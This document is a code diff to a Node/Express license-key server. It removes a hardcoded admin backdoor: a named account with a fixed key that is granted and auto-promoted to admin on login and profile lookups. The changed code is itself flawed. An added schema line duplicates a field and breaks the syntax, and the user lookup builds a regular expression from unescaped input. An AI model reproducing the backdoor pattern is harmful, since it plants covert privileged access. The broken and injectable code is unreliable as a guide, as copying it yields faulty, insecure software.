@@ -29,6 +29,7 @@ const UserSchema = new mongoose.Schema({
     discordId: String,
     avatar: String,
     playtime: { type: Number, default: 0 },
+    subscriptions: { type: Map, of: Number, default: {} }
     subscriptions: { type: Map, of: Number, default: {} },
     isAdmin: { type: Boolean, default: false }
 });
@@ -892,31 +893,9 @@ const seedDatabase = async () => {
 
 seedDatabase();
 
-// --- Helper Functions ---
-async function findUser(username) {
-    if (!username) return null;
-    return await User.findOne({ username: new RegExp(`^${username}$`, 'i') });
-}
-
-// --- Admin Verification Helper ---
-async function verifyAdmin(req) {
-    const secretBody = req.body && req.body.adminSecret;
-    const secretHeader = req.headers && req.headers['admin-secret'];
-    if (secretBody === ADMIN_SECRET || secretHeader === ADMIN_SECRET) return true;
-
-    const username = req.headers['admin-user'];
-    const key = req.headers['admin-key'];
-    
-    if (!username || !key) return false;
-    
-    // Auto-promote and Hardcoded Master Admin Override
-    if (username.toLowerCase() === 'secretfv') {
-        if (key === 'web_1778227756062' || key === 'web_1778227756062 ') return true;
-        await User.updateOne({ username: new RegExp(`^${username}$`, 'i') }, { $set: { isAdmin: true } });
-    }
-    
-    const u = await User.findOne({ username: new RegExp(`^${username}$`, 'i'), key: key });
-    return u && u.isAdmin === true;
+const findUser = async (name) => {
+    if (!name) return null;
+    return await User.findOne({ username: new RegExp('^' + name + '$', 'i') });
 };
 
 // ── WEB ROUTES ────────────────────────────────────────────────
@@ -1275,7 +1254,7 @@ app.post('/admin/delete-key', async (req, res) => {
 });
 
 app.post('/admin/reset-hwid', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     const { username } = req.body;
     const user = await findUser(username);
     if (!user) return res.json({ success: false, message: "User not found" });
@@ -1286,7 +1265,7 @@ app.post('/admin/reset-hwid', async (req, res) => {
 });
 
 app.post('/admin/delete-user', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     const { username } = req.body;
     await User.deleteOne({ username });
     await Key.updateMany({ usedBy: username }, { usedBy: null, redeemedAt: null, boundHWID: null });
@@ -1296,7 +1275,7 @@ app.post('/admin/delete-user', async (req, res) => {
 
 // --- Enhanced Admin Endpoints ---
 app.get('/admin/keys', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     try {
         const keys = await Key.find().sort({ redeemedAt: -1 });
         res.json(keys);
@@ -1304,7 +1283,7 @@ app.get('/admin/keys', async (req, res) => {
 });
 
 app.get('/admin/users', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     try {
         const users = await User.find().sort({ username: 1 });
         res.json(users);
@@ -1312,7 +1291,7 @@ app.get('/admin/users', async (req, res) => {
 });
 
 app.post('/admin/create-keys', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     const { product, type, amount } = req.body;
     const createdKeys = [];
     for (let i = 0; i < amount; i++) {
@@ -1325,7 +1304,7 @@ app.post('/admin/create-keys', async (req, res) => {
 });
 
 app.post('/admin/delete-key', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).send("Unauthorized");
+    if (req.headers['admin-secret'] !== ADMIN_SECRET) return res.status(403).send("Unauthorized");
     const { keyString } = req.body;
     await Key.deleteOne({ keyString });
     res.json({ success: true });
@@ -1366,7 +1345,7 @@ app.get('/download', (req, res) => {
 
 // ── DISCORD BOT INTEGRATION ──────────────────────────────────
 app.post('/admin/key-counts', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).json({ success: false, message: "Unauthorized" });
+    if (req.body.adminSecret !== ADMIN_SECRET) return res.status(403).json({ success: false, message: "Unauthorized" });
 
     try {
         const allKeys = await Key.find({});
@@ -1410,7 +1389,7 @@ app.post('/admin/key-counts', async (req, res) => {
 });
 
 app.post('/admin/ban-key', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).json({ success: false, message: "Unauthorized" });
+    if (req.body.adminSecret !== ADMIN_SECRET) return res.status(403).json({ success: false, message: "Unauthorized" });
     const { key } = req.body;
     try {
         const record = await Key.findOne({ keyString: key });
@@ -1423,7 +1402,7 @@ app.post('/admin/ban-key', async (req, res) => {
 });
 
 app.post('/admin/reset-hwid-by-key', async (req, res) => {
-    if (!(await verifyAdmin(req))) return res.status(403).json({ success: false, message: "Unauthorized" });
+    if (req.body.adminSecret !== ADMIN_SECRET) return res.status(403).json({ success: false, message: "Unauthorized" });
     const { key } = req.body;
     try {
         const record = await Key.findOne({ keyString: key });
@@ -1799,12 +1778,6 @@ app.post('/api/auth/login', async (req, res) => {
             return res.json({ success: false, message: "Incorrect password" });
         }
 
-        // Force admin status for secretfv
-        if (user.username.toLowerCase() === 'secretfv' && !user.isAdmin) {
-            user.isAdmin = true;
-            await user.save();
-        }
-
         // Convert subscriptions Map to object for response
         const subscriptions = {};
         if (user.subscriptions) {
@@ -1819,8 +1792,7 @@ app.post('/api/auth/login', async (req, res) => {
             user: {
                 username: user.username,
                 key: user.key,
-                subscriptions: subscriptions,
-                isAdmin: user.isAdmin || false
+                subscriptions: subscriptions
             }
         });
 
@@ -1837,12 +1809,6 @@ app.get('/api/user/profile/:username', async (req, res) => {
 
         if (!user) {
             return res.json({ success: false, message: "User not found" });
-        }
-
-        // Force admin status for secretfv
-        if (user.username.toLowerCase() === 'secretfv' && !user.isAdmin) {
-            user.isAdmin = true;
-            await user.save();
         }
 
         // Convert subscriptions Map to plain object
@@ -1864,8 +1830,7 @@ app.get('/api/user/profile/:username', async (req, res) => {
                 discordId: user.discordId,
                 avatar: user.avatar,
                 playtime: user.playtime || 0,
-                subscriptions: subscriptions,
-                isAdmin: user.isAdmin || false
+                subscriptions: subscriptions
             }
         });
 
